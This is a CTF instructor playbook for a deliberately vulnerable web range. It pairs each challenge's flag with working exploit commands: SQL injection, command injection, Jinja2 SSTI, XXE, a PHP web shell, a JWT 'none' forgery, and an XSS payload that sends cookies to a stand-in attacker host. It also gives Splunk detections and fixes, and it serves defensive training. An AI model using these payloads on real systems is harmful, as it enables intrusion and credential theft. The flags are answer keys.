# HELP AG VAPT Range — CTF Playbook

Complete solutions for every challenge on the range, the exact commands that
solve them, the SIEM detection use case each one is supposed to trigger, and the
MITRE ATT&CK technique each maps to.

> **Spoiler warning.** This file contains every flag. Give players
> [`README.md`](README.md) and the in-app hints; keep this file for instructors,
> detection engineers and purple-team runs.

> **Deployment warning.** This application has genuine command execution, genuine
> server-side template injection and genuine arbitrary file read. Run it only on
> an isolated range. Never expose it to the Internet or to a production network.
> Every identity, key and token in it is synthetic.

---

## 1. Contents

| Section | What it covers |
|---|---|
| [2. Range setup](#2-range-setup) | Bringing the target and metadata service up |
| [3. Scoring model](#3-scoring-model) | Flags, teams, points |
| [4. Challenge index](#4-challenge-index) | All 22 challenges at a glance |
| [5. MITRE ATT&CK coverage](#5-mitre-attck-coverage) | Technique → challenge matrix |
| [6. Detection use case index](#6-detection-use-case-index) | UC-01 … UC-21 |
| [7. Walkthroughs](#7-walkthroughs) | Per-challenge solution, commands, SPL, fix |
| [8. Full attack chain](#8-full-attack-chain) | Recon → RCE, as one purple-team run |
| [9. Validation](#9-validation) | Automated proof that the range works |
| [10. Instructor operations](#10-instructor-operations) | Reset, monitor, score |

---

## 2. Range setup

### Docker (recommended)

```bash
git clone https://github.com/DrHayabusa/HELPAG-VAPT-Test-Site.git
cd HELPAG-VAPT-Test-Site
cp .env.example .env
docker compose up --build -d
curl -s http://127.0.0.1:5005/health
```

The compose stack brings up two services on the `helpag-ctf-lab` network:

| Service | Address | Role |
|---|---|---|
| `ctf-web` | `127.0.0.1:5005` | The vulnerable application |
| `metadata` | `metadata:8080` (lab network only) | Synthetic cloud instance metadata, the SSRF target |

To let other machines on an isolated lab segment reach the range, set
`LAB_BIND=0.0.0.0` in `.env`. Do this only on a segment you control.

### Native Python

```bash
python3 -m venv .venv
.venv/bin/pip install -r requirements.txt
LAB_MODE=true .venv/bin/python app.py &
.venv/bin/python -m http.server 8080 --directory metadata &   # SSRF target
```

The application refuses every request except `/health` unless `LAB_MODE=true`.
That guard is the last line of defence against an accidental deployment — do not
remove it.

### Sending events to Splunk

```bash
# in .env
SPLUNK_HEC_URL=https://splunk.lab.invalid:8088/services/collector
SPLUNK_HEC_TOKEN=<your HEC token>
SPLUNK_INDEX=vapt_lab
SPLUNK_SOURCETYPE=helpag:owasp:json
SPLUNK_VERIFY_TLS=false
```

Without HEC configured, events still land in `logs/helpag-events.jsonl` as
newline-delimited JSON — point a Universal Forwarder at it instead. See
[`splunk/README.md`](splunk/README.md).

---

## 3. Scoring model

- **Flag format:** `HELPAG{...}`
- **22 challenges, 2800 points total**
- Easy 50–100 · Medium 100–175 · Hard 175–200
- Register a team name on `/`, then submit flags on the same page.
- Flags are verified by SHA-256 hash in the application. Only one flag
  (`inject-sqli-union`) is stored in the database, so a single `UNION SELECT`
  cannot dump the whole event.
- First capture of each challenge is recorded as a **first blood** in the event
  stream (`ctf_flag_captured` with `first_blood=true`).

Scoreboard endpoints:

```bash
curl -s http://127.0.0.1:5005/api/ctf/scoreboard | jq
curl -s http://127.0.0.1:5005/api/ctf/progress   | jq
```

---

## 4. Challenge index

| # | Challenge | ID | Cat | Pts | Diff | OWASP | UC |
|---|---|---|---|---|---|---|---|
| 1 | Crawl Before You Walk | `recon-robots` | Recon | 50 | easy | A01 | UC-01 |
| 2 | Debug Mode Left On | `misconfig-debug` | Misconfig | 50 | easy | A05 | UC-03 |
| 3 | Twelve Factor, Zero Secrets | `misconfig-dotenv` | Misconfig | 100 | easy | A05 | UC-02 |
| 4 | Backup Season | `misconfig-backups` | Misconfig | 75 | easy | A05 | UC-02 |
| 5 | Someone Else's Record | `access-idor` | Access Control | 75 | easy | A01 | UC-04 |
| 6 | Privilege By Parameter | `access-massassign` | Access Control | 125 | medium | A01 | UC-05 |
| 7 | Union of Concerned Tables | `inject-sqli-union` | Injection | 150 | medium | A03 | UC-06 |
| 8 | The Password Is Irrelevant | `inject-sqli-auth` | Injection | 125 | medium | A03 | UC-06 |
| 9 | Mirror Mirror | `xss-reflected` | XSS | 75 | easy | A03 | UC-07 |
| 10 | Message In A Bottle | `xss-stored` | XSS | 100 | medium | A03 | UC-07 |
| 11 | Directory Climbing | `file-traversal` | Path Traversal | 125 | medium | A01 | UC-08 |
| 12 | Ping Of Truth | `rce-cmdi` | RCE | 200 | hard | A03 | UC-09 |
| 13 | Template Of Doom | `rce-ssti` | RCE | 200 | hard | A03 | UC-10 |
| 14 | Entity Of Interest | `inject-xxe` | Injection | 175 | hard | A05 | UC-11 |
| 15 | Drop It Like It's Hot | `upload-unrestricted` | File Upload | 150 | medium | A04 | UC-12 |
| 16 | Algorithm: None | `auth-jwt-none` | Auth | 175 | hard | A07 | UC-14 |
| 17 | Sign Here Please | `auth-weak-secret` | Auth | 200 | hard | A02 | UC-14 |
| 18 | No Lockout Policy | `auth-bruteforce` | Auth | 100 | easy | A07 | UC-13 |
| 19 | Predictable Reset | `auth-reset-token` | Auth | 150 | medium | A02 | UC-15 |
| 20 | Ask The Neighbour | `ssrf-metadata` | SSRF | 175 | medium | A10 | UC-16 |
| 21 | Negative Nancy | `logic-negative` | Business Logic | 100 | easy | A04 | UC-17 |
| 22 | Lookup Not Found | `inject-jndi` | Injection | 125 | medium | A06 | UC-18 |

---

## 5. MITRE ATT&CK coverage

The range exercises 13 techniques across 8 tactics. Use this matrix to justify
the lab against a detection-engineering backlog.

| Tactic | Technique | ID | Challenges |
|---|---|---|---|
| Reconnaissance | Active Scanning: Wordlist Scanning | T1595.003 | `recon-robots`, `misconfig-dotenv`, `misconfig-backups` |
| Reconnaissance | Gather Victim Host Information | T1592 / T1592.002 | `misconfig-debug`, `recon-robots` |
| Initial Access | Exploit Public-Facing Application | T1190 | `access-idor`, `inject-sqli-union`, `inject-sqli-auth`, `rce-cmdi`, `rce-ssti`, `inject-xxe`, `inject-jndi`, `logic-negative` |
| Initial Access | Drive-by Compromise | T1189 | `xss-reflected` |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | `rce-cmdi` |
| Execution | Command and Scripting Interpreter: Python | T1059.006 | `rce-ssti` |
| Execution | Command and Scripting Interpreter: JavaScript | T1059.007 | `xss-reflected`, `xss-stored` |
| Execution | Exploitation for Client Execution | T1203 | `inject-jndi` |
| Persistence | Server Software Component: Web Shell | T1505.003 | `upload-unrestricted`, `xss-stored` |
| Persistence | Account Manipulation | T1098 | `access-massassign` |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 | `access-massassign`, `auth-jwt-none` |
| Defense Evasion | Use Alternate Auth Material: App Access Token | T1550.001 | `auth-jwt-none` |
| Defense Evasion | Use Alternate Auth Material: Web Session Cookie | T1550.004 | `auth-weak-secret` |
| Credential Access | Brute Force: Password Guessing | T1110.001 | `auth-bruteforce` |
| Credential Access | Brute Force: Password Cracking | T1110.002 | `auth-weak-secret` |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | `misconfig-dotenv`, `misconfig-backups` |
| Credential Access | Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | `ssrf-metadata` |
| Credential Access | Modify Authentication Process | T1556 | `auth-reset-token` |
| Discovery | File and Directory Discovery | T1083 | `file-traversal` |
| Discovery | Account Discovery | T1087 | `access-idor` |
| Collection | Data from Local System | T1005 | `file-traversal`, `rce-cmdi`, `inject-xxe` |
| Collection | Data from Information Repositories | T1213 | `inject-sqli-union`, `misconfig-debug` |
| Command and Control | Proxy | T1090 | `ssrf-metadata` |
| Impact | Data Manipulation: Stored Data Manipulation | T1565.001 | `logic-negative` |
| Lateral Movement | Valid Accounts | T1078 / T1078.003 | `inject-sqli-auth`, `auth-bruteforce` |

---

## 6. Detection use case index

All 21 use cases ship as disabled saved searches in
[`splunk/TA-helpag-vapt/default/savedsearches.conf`](splunk/TA-helpag-vapt/default/savedsearches.conf).
Validate field mappings, tune thresholds, then enable.

| UC | Name | Primary event types | Fidelity |
|---|---|---|---|
| UC-01 | Hidden Path Discovery | `recon_robots_read`, `recon_hidden_path`, `http_not_found` | low (tune) |
| UC-02 | Sensitive File Retrieval | `sensitive_file_access`, `directory_listing_access` | medium |
| UC-03 | Debug Endpoint Access | `debug_endpoint_access` | medium |
| UC-04 | IDOR Enumeration | `broken_access_attempt` | medium |
| UC-05 | Privilege Escalation Attempt | `mass_assignment_attempt`, `privilege_change` | high |
| UC-06 | SQL Injection | `sql_query` (suspicious), `sql_error` | high |
| UC-07 | Cross-Site Scripting | `xss_probe`, `stored_xss_persisted`, `admin_review_render` | medium |
| UC-08 | Path Traversal | `path_traversal_attempt` | high |
| UC-09 | Command Injection and Execution | `command_injection_attempt`, `command_execution` | **very high** |
| UC-10 | Server-Side Template Injection | `ssti_attempt`, `template_error` | high |
| UC-11 | XXE and XML Abuse | `xxe_attempt`, `xml_parse_error` | high |
| UC-12 | Dangerous File Upload | `dangerous_upload`, `file_upload` | high |
| UC-13 | Credential Brute Force | `authentication_attempt`, `brute_force_suspected` | medium |
| UC-14 | Unsigned or Forged Token Accepted | `jwt_unsigned_accepted`, `forged_session_detected` | **very high** |
| UC-15 | Account Takeover via Reset | `password_reset_consume`, `account_takeover` | high |
| UC-16 | SSRF to Internal Service | `ssrf_probe` | high |
| UC-17 | Business Logic Abuse | `business_logic_abuse` | medium |
| UC-18 | JNDI Lookup String | `jndi_lookup_detected` | **very high** |
| UC-19 | Monitoring Gap | `monitoring_gap_simulated` | n/a (teaching) |
| UC-20 | Flag Captured | `ctf_flag_captured` | n/a (scoring) |
| UC-21 | Kill Chain Correlation | multi-stage | **highest value** |

Every event also carries `source_ip`, `user_agent`, `path`, `method`, `team` and
`test_id`. Set `X-Lab-Test-ID` on your requests to tag a specific test run:

```bash
curl -s -H 'X-Lab-Test-ID: purple-run-2026-09-14' http://127.0.0.1:5005/api/debug/config
```

---

## 7. Walkthroughs

Every command below was executed against a live instance of this build and
returned the flag shown. `$BASE` is the range URL:

```bash
export BASE=http://127.0.0.1:5005
```

---

### 1. Crawl Before You Walk — `recon-robots` · 50 pts · easy

| | |
|---|---|
| **Vulnerability** | Sensitive path disclosed by `robots.txt`; no access control on the path itself |
| **Endpoints** | `/robots.txt` → `/internal/engineering-notes.txt` |
| **OWASP** | A01:2021 Broken Access Control |
| **MITRE** | T1595.003 Active Scanning: Wordlist Scanning · T1592.002 Gather Victim Host Information: Software |

**Discovery**

```bash
curl -s $BASE/robots.txt
```

`Disallow` entries name `/internal/`, `/backups/`, `/api/debug/` and `/admin/` —
a map of everything the operator wanted hidden. A comment names the notes file
outright.

**Exploitation**

```bash
curl -s $BASE/internal/engineering-notes.txt
```

**Flag** `HELPAG{r0b0ts_txt_1s_n0t_4cc3ss_c0ntr0l}`

The notes also leak three later challenges: the default session secret, the
un-migrated legacy login, and the diagnostics endpoint that shells out.

**Detection — UC-01**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (recon_robots_read,recon_hidden_path,http_not_found)
| bin _time span=5m
| stats count dc(path) as unique_paths values(path) as paths by _time source_ip
| where count>=10 OR unique_paths>=8
```

A single read is not an incident. Tune on volume and on the ratio of 404s to
200s — the signal is a source walking a wordlist, not a browser.

**Remediation** — `robots.txt` is a crawler hint, never an authorisation
boundary. Put real authentication in front of `/internal/`, and stop listing
sensitive paths in a file served to anonymous users.

---

### 2. Debug Mode Left On — `misconfig-debug` · 50 pts · easy

| | |
|---|---|
| **Vulnerability** | Unauthenticated debug endpoint disclosing configuration |
| **Endpoint** | `/api/debug/config` |
| **OWASP** | A05:2021 Security Misconfiguration |
| **MITRE** | T1592 Gather Victim Host Information · T1213 Data from Information Repositories |

**Exploitation**

```bash
curl -s $BASE/api/debug/config | jq
```

**Flag** `HELPAG{d3bug_3ndp01nt_sh1pp3d_t0_pr0d}`

The response also discloses `"jwt_algorithms_accepted": ["HS256","none"]`, which
is the tell for challenge 16.

**Detection — UC-03**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=debug_endpoint_access
| stats count by source_ip user_agent
```

**Remediation** — gate debug routes behind an environment flag that is off by
default, and fail the build if a debug blueprint registers in a production profile.

---

### 3. Twelve Factor, Zero Secrets — `misconfig-dotenv` · 100 pts · easy

| | |
|---|---|
| **Vulnerability** | `.env` served from the web root |
| **Endpoint** | `/.env` |
| **OWASP** | A05:2021 Security Misconfiguration |
| **MITRE** | T1552.001 Unsecured Credentials: Credentials In Files · T1595.003 |

**Discovery**

```bash
ffuf -u $BASE/FUZZ -w wordlists/helpag-paths.txt -mc 200 -t 20
```

**Exploitation**

```bash
curl -s $BASE/.env
```

**Flag** `HELPAG{d0t3nv_s3rv3d_fr0m_w3br00t}`

This one is a pivot, not an endpoint: it hands you `LAB_SESSION_SECRET`
(challenge 17), `JWT_SIGNING_KEY` (challenge 16) and `SVC_BACKUP_PASSWORD`
(challenge 18).

**Detection — UC-02**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (sensitive_file_access,directory_listing_access,sensitive_data_exposure)
| stats count values(artifact) as artifacts dc(artifact) as unique_artifacts by source_ip
```

**Remediation** — never place `.env` inside the document root; block dotfiles at
the reverse proxy; rotate every secret that has ever been web-reachable.

---

### 4. Backup Season — `misconfig-backups` · 75 pts · easy

| | |
|---|---|
| **Vulnerability** | Directory listing enabled over a backup folder |
| **Endpoints** | `/backups/` → `/backups/site-config.bak` |
| **OWASP** | A05:2021 Security Misconfiguration |
| **MITRE** | T1595.003 · T1530 Data from Cloud Storage |

**Exploitation**

```bash
curl -s $BASE/backups/
curl -s $BASE/backups/site-config.bak
```

**Flag** `HELPAG{b4ckup_f1l3_l3ft_b3h1nd}`

`users-export.csv` in the same folder gives you the account list for challenge 18.

**Detection — UC-02** (same search as challenge 3; `directory_listing_access`
fires on the index page).

**Remediation** — disable autoindex, store backups outside the web root, and
treat a `.bak` in a document root as a build failure.

---

### 5. Someone Else's Record — `access-idor` · 75 pts · easy

| | |
|---|---|
| **Vulnerability** | IDOR — no authentication, no ownership check, integer identifiers |
| **Endpoint** | `/api/users/<id>` |
| **OWASP** | A01:2021 Broken Access Control |
| **MITRE** | T1190 Exploit Public-Facing Application · T1087 Account Discovery |

**Discovery** — walk the identifier space:

```bash
for id in $(seq 1 20); do
  printf '%s ' "$id"; curl -s "$BASE/api/users/$id" | head -c 120; echo
done
```

Only a few ids exist, which is the hint that the interesting record is elsewhere.

**Exploitation**

```bash
ffuf -u "$BASE/api/users/FUZZ" -w <(seq 1 2000) -mc 200 -t 30
curl -s $BASE/api/users/1337 | jq
```

**Flag** `HELPAG{1d0r_h0r1z0nt4l_3num3r4t10n}`

**Detection — UC-04**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=broken_access_attempt
| bin _time span=5m
| stats count dc(object_id) as distinct_objects values(object_id) as object_ids by _time source_ip
| where distinct_objects>=5
```

The detection is the *enumeration*, not the single read — one user fetching one
record is normal, one source fetching forty in a minute is not.

**Remediation** — authorise every object access against the caller's identity.
Non-sequential identifiers are defence in depth, not a control.

---

### 6. Privilege By Parameter — `access-massassign` · 125 pts · medium

| | |
|---|---|
| **Vulnerability** | Mass assignment — the request body is bound to the record wholesale |
| **Endpoint** | `POST /api/profile/update` |
| **OWASP** | A01:2021 Broken Access Control |
| **MITRE** | T1548 Abuse Elevation Control Mechanism · T1098 Account Manipulation |

**Discovery** — the normal request only sends `email` and `note`. Add the field
the server is keeping to itself, which `/api/users/1337` showed you is `role`.

**Exploitation**

```bash
curl -s -X POST $BASE/api/profile/update \
  -H 'Content-Type: application/json' \
  -d '{"email":"a@lab.invalid","role":"admin"}' | jq
```

**Flag** `HELPAG{m4ss_4ss1gnm3nt_r0l3_0v3rwr1t3}`

**Detection — UC-05**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (mass_assignment_attempt,privilege_change,unsigned_data_import)
| stats count values(mechanism) as mechanisms values(new_role) as roles values(sensitive_fields) as fields by source_ip
```

`privilege_change` with `mechanism=mass_assignment` is a high-fidelity alert:
a role changed on a code path that has no business changing roles.

**Remediation** — bind to an explicit allow-list DTO. Never hand a request body
straight to an ORM model.

---

### 7. Union of Concerned Tables — `inject-sqli-union` · 150 pts · medium

| | |
|---|---|
| **Vulnerability** | SQL injection via string concatenation |
| **Endpoint** | `GET /api/products/search?q=` |
| **OWASP** | A03:2021 Injection |
| **MITRE** | T1190 Exploit Public-Facing Application · T1213 Data from Information Repositories |

**Discovery** — the endpoint echoes the statement it built, so errors are free:

```bash
curl -sG $BASE/api/products/search --data-urlencode "q='" | jq
```

**Enumerate the schema** (SQLite):

```bash
curl -sG $BASE/api/products/search \
  --data-urlencode "q=' UNION SELECT 1,name,sql FROM sqlite_master-- " | jq
```

This reveals a `flags` table with `label` and `value` columns.

**Exploitation**

```bash
curl -sG $BASE/api/products/search \
  --data-urlencode "q=' UNION SELECT id,label,value FROM flags-- " | jq
```

**Flag** `HELPAG{un10n_s3l3ct_dump3d_th3_fl4g_t4bl3}`

**With sqlmap**

```bash
sqlmap -u "$BASE/api/products/search?q=test" -p q --batch --dbms=sqlite --dump -T flags
```

Run sqlmap at least once — it is the noisiest thing you can point at the range
and it makes UC-06 light up unmistakably.

**Detection — UC-06**

```spl
index=vapt_lab sourcetype=helpag:owasp:json (event_type=sql_error OR (event_type=sql_query suspicious=true))
| stats count values(query_input) as inputs values(statement) as statements by source_ip event_type
```

**Remediation** — parameterised queries, always. Never interpolate input into
SQL, and never return the SQL statement or driver error to the client.

---

### 8. The Password Is Irrelevant — `inject-sqli-auth` · 125 pts · medium

| | |
|---|---|
| **Vulnerability** | Authentication bypass via SQL injection |
| **Endpoint** | `POST /api/legacy/login` |
| **OWASP** | A03:2021 Injection |
| **MITRE** | T1190 · T1078 Valid Accounts |

**Exploitation** — comment out the password check:

```bash
curl -s -X POST $BASE/api/legacy/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin'\''-- ","password":"anything"}' | jq
```

Tautology variant:

```bash
curl -s -X POST $BASE/api/legacy/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"x'\'' OR '\''1'\''='\''1'\'' -- ","password":"x"}' | jq
```

**Flag** `HELPAG{sql_4uth_byp4ss_t4ut0l0gy}`

**Detection — UC-06** plus UC-13: the same request raises an
`authentication_attempt` with `injection=true`, which is a far stronger signal
than either event alone.

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=authentication_attempt injection=true
| stats count values(username) as attempted by source_ip
```

**Remediation** — parameterise, and do not build authentication out of a
`SELECT … WHERE password = '…'` at all. Compare a verifier against a stored hash.

---

### 9. Mirror Mirror — `xss-reflected` · 75 pts · easy

| | |
|---|---|
| **Vulnerability** | Reflected XSS — no output encoding |
| **Endpoint** | `GET /reflect?name=` |
| **OWASP** | A03:2021 Injection |
| **MITRE** | T1059.007 Command and Scripting Interpreter: JavaScript · T1189 Drive-by Compromise |

**Exploitation**

```bash
curl -sG $BASE/reflect --data-urlencode 'name=<script>alert(1)</script>'
curl -sG $BASE/reflect --data-urlencode 'name=<img src=x onerror=alert(document.domain)>'
```

**Flag** `HELPAG{r3fl3ct3d_xss_1nt0_th3_d0m}`

**Detection — UC-07**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=xss_probe
| search attack_classes="*xss*"
| stats count values(reflected_input) as payloads by source_ip
```

**Remediation** — contextual output encoding, a strict `Content-Security-Policy`
without `unsafe-inline`, and templates that escape by default.

---

### 10. Message In A Bottle — `xss-stored` · 100 pts · medium

| | |
|---|---|
| **Vulnerability** | Stored XSS — persisted raw, rendered raw to every visitor |
| **Endpoints** | `POST /guestbook` → `GET /admin/review` |
| **OWASP** | A03:2021 Injection |
| **MITRE** | T1059.007 · T1505.003 Server Software Component: Web Shell |

**Exploitation** — plant the payload, then trigger the victim:

```bash
curl -s -X POST $BASE/guestbook \
  -H 'Content-Type: application/json' \
  -d '{"author":"tester","message":"<script>fetch(\"https://attacker.lab.invalid/?c=\"+document.cookie)</script>"}'

curl -s $BASE/admin/review | jq
```

`/admin/review` simulates an administrator opening the moderation queue in a
browser. If a stored entry contains script, the simulated session is treated as
compromised and the flag is released. No real browser or callback is needed.

**Flag** `HELPAG{st0r3d_xss_p3rs1sts_f0r_3v3ry0n3}`

**Detection — UC-07**, and this is the case where the two-stage correlation matters:

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (stored_xss_persisted,admin_review_render)
| transaction maxspan=1h
| table _time source_ip event_type payloads_executed payload
```

`admin_review_render` with `payloads_executed>0` means a stored payload actually
rendered in a privileged context — treat it as a confirmed compromise, not a probe.

**Remediation** — encode on output, not on input; sanitise HTML with an
allow-list parser if rich text is genuinely required; set `HttpOnly` on session
cookies so a successful XSS cannot read them.

---

### 11. Directory Climbing — `file-traversal` · 125 pts · medium

| | |
|---|---|
| **Vulnerability** | Path traversal — user filename joined onto a base path without containment |
| **Endpoint** | `GET /api/documents/download?file=` |
| **OWASP** | A01:2021 Broken Access Control |
| **MITRE** | T1083 File and Directory Discovery · T1005 Data from Local System |

**Discovery**

```bash
curl -sG $BASE/api/documents/download --data-urlencode 'file=welcome.txt'
curl -sG $BASE/api/documents/download --data-urlencode 'file=../../../../etc/passwd'
```

The 404 response echoes `resolved`, which tells you the base directory and makes
the climb trivial to calibrate.

**Exploitation**

```bash
curl -sG $BASE/api/documents/download --data-urlencode 'file=../flagstore/traversal.flag'
```

**Flag** `HELPAG{p4th_tr4v3rs4l_0uts1d3_th3_r00t}`

**Detection — UC-08**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=path_traversal_attempt
| stats count values(requested_file) as requested values(resolved_path) as resolved by source_ip
```

High fidelity: legitimate traffic does not contain `../`. Alert on the first event.

**Remediation** — resolve the joined path with `realpath` and reject anything
that escapes the base directory; better, index documents by identifier and never
accept a filename from the client at all.

---

### 12. Ping Of Truth — `rce-cmdi` · 200 pts · hard

| | |
|---|---|
| **Vulnerability** | OS command injection — parameter concatenated into a shell command line |
| **Endpoint** | `GET /api/diagnostics/ping?host=` |
| **OWASP** | A03:2021 Injection |
| **MITRE** | T1059.004 Unix Shell · T1190 · T1005 Data from Local System |

**Discovery** — confirm the legitimate path, then chain:

```bash
curl -sG $BASE/api/diagnostics/ping --data-urlencode 'host=127.0.0.1'
curl -sG $BASE/api/diagnostics/ping --data-urlencode 'host=127.0.0.1; id'
```

**Exploitation**

```bash
curl -sG $BASE/api/diagnostics/ping --data-urlencode 'host=127.0.0.1; cat flagstore/cmdi.flag'
curl -sG $BASE/api/diagnostics/ping --data-urlencode 'host=127.0.0.1; ls -la /app'
curl -sG $BASE/api/diagnostics/ping --data-urlencode 'host=$(cat flagstore/cmdi.flag)'
```

**Flag** `HELPAG{c0mm4nd_1nj3ct10n_g4v3_m3_4_sh3ll}`

**On a Windows/IIS deployment** the backend runs under `cmd.exe`, where `;` is
not a separator. Use `&` and `type` instead:

```bash
curl -sG $BASE/api/diagnostics/ping --data-urlencode 'host=127.0.0.1 & type flagstore\cmdi.flag'
```

> This is real execution as the `lab` user inside the container. It is the single
> most dangerous thing on the range and the reason `LAB_MODE` exists. Do not run
> this application anywhere an attacker could reach it.

**Detection — UC-09**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (command_injection_attempt,command_execution)
| stats count values(command_line) as command_lines values(exit_code) as exit_codes by source_ip
```

If you have an EDR or auditd on the host, correlate the web event with the
process event — a `python` process spawning `sh` spawning `cat` is the
host-side half of the same story, and proving that correlation works end to end
is the highest-value exercise on this range:

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=command_execution
| eval join_time=_time
| join type=left source_ip [ search index=linux sourcetype=auditd type=EXECVE parent_process=python ]
| table _time source_ip command_line process parent_process
```

**Remediation** — do not shell out. Use a library, or `subprocess` with an
argument list and `shell=False`, and validate the host against a strict pattern.

---

### 13. Template Of Doom — `rce-ssti` · 200 pts · hard

| | |
|---|---|
| **Vulnerability** | Server-side template injection — user input compiled as Jinja2 |
| **Endpoint** | `GET /api/newsletter/preview?template=` |
| **OWASP** | A03:2021 Injection |
| **MITRE** | T1059.006 Python · T1190 |

**Discovery** — the classic arithmetic probe:

```bash
curl -sG $BASE/api/newsletter/preview --data-urlencode 'template={{7*7}}'
```

`49` confirms server-side evaluation.

**Escalate to configuration disclosure**

```bash
curl -sG $BASE/api/newsletter/preview --data-urlencode 'template={{ config.items() }}'
```

**Exploitation** — break out to the runtime:

```bash
curl -sG $BASE/api/newsletter/preview --data-urlencode \
  "template={{ cycler.__init__.__globals__.os.popen('cat flagstore/ssti.flag').read() }}"
```

**On a Windows/IIS deployment** the `os.popen('cat ...')` form fails twice over:
`cat` does not exist, and a backslash path is consumed by Jinja's own string
parsing before Python ever sees it. Read the file directly instead — `open()`
takes forward slashes on both platforms:

```bash
curl -sG $BASE/api/newsletter/preview --data-urlencode \
  "template={{ cycler.__init__.__globals__.__builtins__.open('flagstore/ssti.flag').read() }}"
```

Alternative gadget chain if `cycler` is unavailable in your build:

```bash
curl -sG $BASE/api/newsletter/preview --data-urlencode \
  "template={{ ''.__class__.__mro__[1].__subclasses__() }}"
```

**Flag** `HELPAG{j1nj4_sst1_r34ch3d_th3_runt1m3}`

**Detection — UC-10**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (ssti_attempt,template_error)
| stats count values(template_input) as templates by source_ip
```

Template errors are the loudest part of an SSTI campaign — an attacker probing
gadget chains generates far more `template_error` than successes. Alert on the
error rate, not just the success.

**Remediation** — never compile user input as a template. Pass it as *data* to a
pre-compiled template. If user-authored templates are a product requirement, use
a sandboxed engine with no attribute access.

---

### 14. Entity Of Interest — `inject-xxe` · 175 pts · hard

| | |
|---|---|
| **Vulnerability** | XXE — XML parsed with DTD loading and entity resolution enabled |
| **Endpoint** | `POST /api/suppliers/import` |
| **OWASP** | A05:2021 Security Misconfiguration |
| **MITRE** | T1190 · T1005 Data from Local System |

**Exploitation**

```bash
curl -s -X POST $BASE/api/suppliers/import \
  -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?>
<!DOCTYPE supplier [<!ENTITY xxe SYSTEM "file:///app/flagstore/xxe.flag">]>
<supplier><name>&xxe;</name></supplier>'
```

Read an arbitrary file the same way:

```bash
curl -s -X POST $BASE/api/suppliers/import \
  -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?>
<!DOCTYPE s [<!ENTITY e SYSTEM "file:///etc/passwd">]><s>&e;</s>'
```

**Flag** `HELPAG{xx3_3xt3rn4l_3nt1ty_f1l3_r34d}`

> Running natively rather than in Docker? Replace `/app` with your checkout path.
> Outbound entity resolution is disabled (`no_network=True`), so out-of-band XXE
> will not exfiltrate from this range by design.

**Detection — UC-11**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (xxe_attempt,xml_parse_error)
| stats count values(declares_doctype) as doctype values(payload_bytes) as sizes by source_ip
```

A `DOCTYPE` in inbound XML from an untrusted client is close to a binary
indicator — very few legitimate integrations send one.

**Remediation** — disable DTD loading and entity resolution in the parser
(`defusedxml` in Python; `FEATURE_SECURE_PROCESSING` in Java). Prefer JSON.

---

### 15. Drop It Like It's Hot — `upload-unrestricted` · 150 pts · medium

| | |
|---|---|
| **Vulnerability** | Unrestricted file upload — no extension allow-list, no content inspection |
| **Endpoint** | `POST /api/upload` |
| **OWASP** | A04:2021 Insecure Design |
| **MITRE** | T1505.003 Web Shell · T1105 Ingress Tool Transfer |

**Exploitation**

```bash
printf '<?php system($_GET["cmd"]); ?>\n' > /tmp/shell.php
curl -s -X POST $BASE/api/upload -F 'file=@/tmp/shell.php' | jq
curl -s $BASE/uploads/shell.php
```

**Flag** `HELPAG{unr3str1ct3d_upl04d_w3bsh3ll}`

> The range stops short of executing uploaded code — `/uploads/<name>` always
> serves `text/plain`. The finding being taught is the unrestricted write, and
> the detection value is the upload event. Nothing you upload here becomes a live
> web shell, which is deliberate: a shared range should not hand every team
> arbitrary persistent execution.

**Detection — UC-12**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=dangerous_upload
| stats count values(filename) as filenames values(extension) as extensions by source_ip
```

Pair it with file-integrity monitoring on the upload directory — a new file with
a server-side script extension appearing under a web root is the host-side signal.

**Remediation** — allow-list extensions *and* verify content type; rename on
write to a generated identifier; store uploads outside the web root or on object
storage; serve them from a separate domain with `Content-Disposition: attachment`.

---

### 16. Algorithm: None — `auth-jwt-none` · 175 pts · hard

| | |
|---|---|
| **Vulnerability** | JWT verification honours the algorithm declared in the token |
| **Endpoints** | `GET /api/token` → `GET /api/admin/report` |
| **OWASP** | A07:2021 Identification and Authentication Failures |
| **MITRE** | T1550.001 Application Access Token · T1548 Abuse Elevation Control Mechanism |

**Discovery** — get a legitimate token and decode it:

```bash
TOKEN=$(curl -s "$BASE/api/token?username=alice" | jq -r .token)
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
curl -s -H "Authorization: Bearer $TOKEN" $BASE/api/admin/report | jq
```

The signed token is `role: user` and gets a 403. `/api/debug/config` already told
you the API accepts `none`.

**Exploitation** — forge an unsigned admin token:

```bash
b64url() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
HEADER=$(printf '%s' '{"alg":"none","typ":"JWT"}'        | b64url)
PAYLOAD=$(printf '%s' '{"sub":"attacker","role":"admin"}' | b64url)
FORGED="$HEADER.$PAYLOAD."

curl -s -H "Authorization: Bearer $FORGED" $BASE/api/admin/report | jq
```

**Flag** `HELPAG{jwt_4lg_n0n3_4cc3pt3d_by_th3_4p1}`

> The signing key `labkey` is also recoverable from `/.env`, so an HS256 forgery
> works too — but the flag is released only for the *unsigned* token, so that the
> `jwt_unsigned_accepted` detection is the thing being exercised.

**Detection — UC-14**

```spl
